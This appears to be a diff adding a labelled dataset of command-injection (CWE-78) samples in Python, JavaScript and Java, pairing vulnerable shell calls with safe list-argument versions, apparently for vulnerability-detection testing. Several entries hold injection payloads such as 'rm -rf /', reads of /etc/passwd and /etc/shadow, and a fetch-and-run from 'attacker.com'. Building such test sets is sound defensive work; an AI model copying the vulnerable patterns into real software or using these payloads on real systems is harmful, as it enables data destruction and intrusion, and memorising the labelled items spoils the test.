@@ -1,0 +1,102 @@
+[
+  {
+    "id": "CMD-001",
+    "vulnerability_type": "CWE-78",
+    "language": "python",
+    "has_vulnerability": true,
+    "code": "import os\n\ndef convert_file(filename):\n    os.system(f\"convert {filename} output.pdf\")\n    return \"File processed\"",
+    "description": "Direct os.system with f-string",
+    "severity": 10,
+    "exploit": "filename = \"file.jpg; rm -rf /\""
+  },
+  {
+    "id": "CMD-002",
+    "vulnerability_type": "CWE-78",
+    "language": "python",
+    "has_vulnerability": false,
+    "code": "import subprocess\n\ndef convert_file(filename):\n    subprocess.run(['convert', filename, 'output.pdf'], check=True)\n    return \"File processed\"",
+    "description": "subprocess with list arguments",
+    "severity": 0,
+    "exploit": null
+  },
+  {
+    "id": "CMD-003",
+    "vulnerability_type": "CWE-78",
+    "language": "python",
+    "has_vulnerability": true,
+    "code": "import subprocess\n\ndef ping_host(host):\n    result = subprocess.call(f\"ping -c 4 {host}\", shell=True)\n    return result",
+    "description": "subprocess with shell=True and string interpolation",
+    "severity": 9,
+    "exploit": "host = \"google.com; cat /etc/passwd\""
+  },
+  {
+    "id": "CMD-004",
+    "vulnerability_type": "CWE-78",
+    "language": "javascript",
+    "has_vulnerability": true,
+    "code": "const exec = require('child_process').exec;\n\nfunction compressFile(filename) {\n  exec(`tar -czf archive.tar.gz ${filename}`);\n}",
+    "description": "Node.js exec with template literal",
+    "severity": 10,
+    "exploit": "filename = \"; rm -rf /\""
+  },
+  {
+    "id": "CMD-005",
+    "vulnerability_type": "CWE-78",
+    "language": "javascript",
+    "has_vulnerability": false,
+    "code": "const { execFile } = require('child_process');\n\nfunction compressFile(filename) {\n  execFile('tar', ['-czf', 'archive.tar.gz', filename]);\n}",
+    "description": "Node.js execFile with array arguments",
+    "severity": 0,
+    "exploit": null
+  },
+  {
+    "id": "CMD-006",
+    "vulnerability_type": "CWE-78",
+    "language": "python",
+    "has_vulnerability": true,
+    "code": "import os\n\ndef backup_database(db_name):\n    command = \"mysqldump -u root \" + db_name + \" > backup.sql\"\n    os.system(command)",
+    "description": "String concatenation in backup command",
+    "severity": 10,
+    "exploit": "db_name = \"testdb; curl attacker.com/shell.sh | bash\""
+  },
+  {
+    "id": "CMD-007",
+    "vulnerability_type": "CWE-78",
+    "language": "python",
+    "has_vulnerability": true,
+    "code": "def list_directory(path):\n    import subprocess\n    return subprocess.check_output(f\"ls -la {path}\", shell=True).decode()",
+    "description": "check_output with shell=True",
+    "severity": 9,
+    "exploit": "path = \"/tmp; whoami\""
+  },
+  {
+    "id": "CMD-008",
+    "vulnerability_type": "CWE-78",
+    "language": "python",
+    "has_vulnerability": false,
+    "code": "def list_directory(path):\n    import subprocess\n    return subprocess.check_output(['ls', '-la', path]).decode()",
+    "description": "check_output with list arguments",
+    "severity": 0,
+    "exploit": null
+  },
+  {
+    "id": "CMD-009",
+    "vulnerability_type": "CWE-78",
+    "language": "java",
+    "has_vulnerability": true,
+    "code": "public void processImage(String imagePath) {\n    Runtime.getRuntime().exec(\"imagemagick \" + imagePath);\n}",
+    "description": "Runtime.exec with string concatenation",
+    "severity": 9,
+    "exploit": "imagePath = \"image.jpg; cat /etc/shadow\""
+  },
+  {
+    "id": "CMD-010",
+    "vulnerability_type": "CWE-78",
+    "language": "java",
+    "has_vulnerability": false,
+    "code": "public void processImage(String imagePath) {\n    String[] command = {\"imagemagick\", imagePath};\n    Runtime.getRuntime().exec(command);\n}",
+    "description": "Runtime.exec with string array",
+    "severity": 0,
+    "exploit": null
+  }
+]
